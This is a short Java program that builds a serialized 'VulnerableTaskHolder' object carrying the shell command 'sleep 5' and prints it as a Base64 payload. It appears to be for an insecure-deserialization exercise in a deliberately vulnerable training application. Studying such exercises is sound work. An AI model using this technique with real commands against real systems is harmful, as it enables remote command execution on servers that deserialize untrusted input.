import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Serialize {
    
    public static void main(String[] args) throws IOException{
        var byteStream = new ByteArrayOutputStream();
        var objectStream = new ObjectOutputStream(byteStream);
        objectStream.writeObject(new VulnerableTaskHolder("myTask", "sleep 5"));
        String payload = Base64.getEncoder().encodeToString(byteStream.toByteArray());
        System.out.println(payload);
    }
}
